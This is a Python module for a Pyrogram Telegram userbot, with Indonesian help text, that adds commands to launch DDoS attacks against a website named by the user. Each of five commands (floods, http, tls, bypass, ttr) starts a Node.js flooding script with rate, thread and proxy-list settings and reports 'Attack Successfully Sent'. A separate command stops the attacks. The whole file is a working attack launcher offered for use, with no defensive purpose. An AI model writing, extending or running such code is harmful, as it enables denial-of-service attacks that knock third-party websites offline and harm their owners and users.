from pyrogram import Client, filters
from pyrogram import *
from PyroUbot import PY
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import subprocess

# Inisialisasi proses berdasarkan chat_id
processes = {}
time_limit = 300  # Batas waktu maksimum (dalam detik)

__MODULE__ = "ᴅᴅᴏs"
__HELP__ = """
<blockquote><b>Bantuan Untuk DDOS Cess</b>

• <b>ᴘᴇʀɪɴᴛᴀʜ</b> : <code>{0}ddosfloods</code> <b>[Target] [Time]</b>
• <b>ᴘᴇʀɪɴᴛᴀʜ</b> : <code>{0}ddoshttp</code> <b>[Target] [Time]</b>
• <b>ᴘᴇʀɪɴᴛᴀʜ</b> : <code>{0}ddostls</code> <b>[Target] [Time]</b>
• <b>ᴘᴇʀɪɴᴛᴀʜ</b> : <code>{0}ddosbypass</code> <b>[Target] [Time]</b>
• <b>ᴘᴇʀɪɴᴛᴀʜ</b> : <code>{0}ddosttr</code> <b>[Target] [Time]</b>
• <b>Penjelasan : Gunakan ᴘᴇʀɪɴᴛᴀʜ <code>{0}DDOS Untuk Menyerang Website</code></b>

Total Methods: 5
Time Limit: 300
My Owner: @alfsefyy

List Methods
-floods
-http
-tls
-bypass
-ttr</b></blockquote>

"""

@PY.UBOT("ddosfloods")
@PY.OWNER
@PY.TOP_CMD
async def ddos_command(client, message):
    # Ambil argumen dari pesan
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.reply_text("<blockquote><b>Gunakan Format: ddosfloods [target] [time] Cess</b></blockquote>")
        return

    target = args[1]
    try:
        time = int(args[2])
    except ValueError:
        await message.reply_text("Waktu Harus Berupa Angka Cess!")
        return

    # Validasi waktu
    if time > time_limit or time <= 0:
        await message.reply_text(f"Waktu Tidak Valid Atau Melebihi Batas {time_limit} Detik Cess.")
        return

    # Jalankan proses serangan
    process = subprocess.Popen(
        ["node", "./core/helpers/floods.js", target, str(time), "110", "15", "proxy.txt"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    chat_id = message.chat.id
    if chat_id not in processes:
        processes[chat_id] = []
    processes[chat_id].append(process)

    # Kirim pesan sukses
    await message.reply_text(
        f"<blockquote><b>Attack Successfully Sent By Erdy Cess🔥🔥\nTarget: {target}\nTime: {time}\nRate: 110\nThread: 15\nDDoS By Erdy Cess🔥🔥</b></blockquote>",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("Stop", callback_data=f"stop_{chat_id}")]]
        )
    )
    
@PY.UBOT("ddoshttp")
@PY.OWNER
@PY.TOP_CMD
async def ddos_command(client, message):
    # Ambil argumen dari pesan
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.reply_text("<blockquote><b>Gunakan Format: ddoshttp [target] [time] Cess</b></blockquote>")
        return

    target = args[1]
    try:
        time = int(args[2])
    except ValueError:
        await message.reply_text("Waktu Harus Berupa Angka Cess!")
        return

    # Validasi waktu
    if time > time_limit or time <= 0:
        await message.reply_text(f"Waktu Tidak Valid Atau Melebihi Batas {time_limit} Detik Cess.")
        return

    # Jalankan proses serangan
    process = subprocess.Popen(
        ["node", "./core/helpers/http.js", target, str(time), "110", "15", "proxy.txt"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    chat_id = message.chat.id
    if chat_id not in processes:
        processes[chat_id] = []
    processes[chat_id].append(process)

    # Kirim pesan sukses
    await message.reply_text(
        f"<blockquote><b>Attack Successfully Sent By Erdy Cess🔥🔥\nTarget: {target}\nTime: {time}\nRate: 110\nThread: 15\nDDoS By Erdy Cess🔥🔥</b></blockquote>",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("Stop", callback_data=f"stop_{chat_id}")]]
        )
    )
    
@PY.UBOT("ddostls")
@PY.OWNER
@PY.TOP_CMD
async def ddos_command(client, message):
    # Ambil argumen dari pesan
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.reply_text("<blockquote><b>Gunakan Format: ddostls [target] [time] Cess</b></blockquote>")
        return

    target = args[1]
    try:
        time = int(args[2])
    except ValueError:
        await message.reply_text("Waktu Harus Berupa Angka Cess!")
        return

    # Validasi waktu
    if time > time_limit or time <= 0:
        await message.reply_text(f"Waktu Tidak Valid Atau Melebihi Batas {time_limit} Detik Cess.")
        return

    # Jalankan proses serangan
    process = subprocess.Popen(
        ["node", "./core/helpers/ttr.js", target, str(time), "110", "15", "proxy.txt"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    chat_id = message.chat.id
    if chat_id not in processes:
        processes[chat_id] = []
    processes[chat_id].append(process)

    # Kirim pesan sukses
    await message.reply_text(
        f"<blockquote><b>Attack Successfully Sent By Erdy Cess🔥🔥\nTarget: {target}\nTime: {time}\nRate: 110\nThread: 15\nDDoS By Erdy Cess🔥🔥</b></blockquote>",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("Stop", callback_data=f"stop_{chat_id}")]]
        )
    )

@PY.UBOT("ddosbypass")
@PY.OWNER
@PY.TOP_CMD
async def ddos_command(client, message):
    # Ambil argumen dari pesan
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.reply_text("<blockquote><b>Gunakan Format: ddosbypass [target] [time] Cess</b></blockquote>")
        return

    target = args[1]
    try:
        time = int(args[2])
    except ValueError:
        await message.reply_text("Waktu Harus Berupa Angka Cess!")
        return

    # Validasi waktu
    if time > time_limit or time <= 0:
        await message.reply_text(f"Waktu Tidak Valid Atau Melebihi Batas {time_limit} Detik Cess.")
        return

    # Jalankan proses serangan
    process = subprocess.Popen(
        ["node", "./core/helpers/ttr.js", target, str(time), "110", "15", "proxy.txt"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    chat_id = message.chat.id
    if chat_id not in processes:
        processes[chat_id] = []
    processes[chat_id].append(process)

    # Kirim pesan sukses
    await message.reply_text(
        f"<blockquote><b>Attack Successfully Sent By Erdy Cess🔥🔥\nTarget: {target}\nTime: {time}\nRate: 110\nThread: 15\nDDoS By Erdy Cess🔥🔥</b></blockquote>",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("Stop", callback_data=f"stop_{chat_id}")]]
        )
    )

@PY.UBOT("ddosttr")
@PY.OWNER
@PY.TOP_CMD
async def ddos_command(client, message):
    # Ambil argumen dari pesan
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.reply_text("<blockquote><b>Gunakan Format: ddosttr [target] [time] Cess</b></blockquote>")
        return

    target = args[1]
    try:
        time = int(args[2])
    except ValueError:
        await message.reply_text("Waktu Harus Berupa Angka Cess!")
        return

    # Validasi waktu
    if time > time_limit or time <= 0:
        await message.reply_text(f"Waktu Tidak Valid Atau Melebihi Batas {time_limit} Detik Cess.")
        return

    # Jalankan proses serangan
    process = subprocess.Popen(
        ["node", "./core/helpers/ttr.js", target, str(time), "110", "15", "proxy.txt"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    chat_id = message.chat.id
    if chat_id not in processes:
        processes[chat_id] = []
    processes[chat_id].append(process)

    # Kirim pesan sukses
    await message.reply_text(
        f"<blockquote><b>Attack Successfully Sent By Erdy Cess🔥🔥\nTarget: {target}\nTime: {time}\nRate: 110\nThread: 15\nDDoS By Erdy Cess🔥🔥</b></blockquote>",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("Stop", callback_data=f"stop_{chat_id}")]]
        )
    )

@PY.UBOT("stopddos")
@PY.OWNER
@PY.TOP_CMD
async def stop_attack(client, message):
    chat_id = message.chat.id
    if chat_id in processes and processes[chat_id]:
        for process in processes[chat_id]:
            process.terminate()
        processes[chat_id] = []
        await message.reply_text("Attack Berhasil Dihentikan Cess!")
    else:
        await message.reply_text("Tidak Ada Proses Yang Berjalan Untuk Dihentikan Cess.")
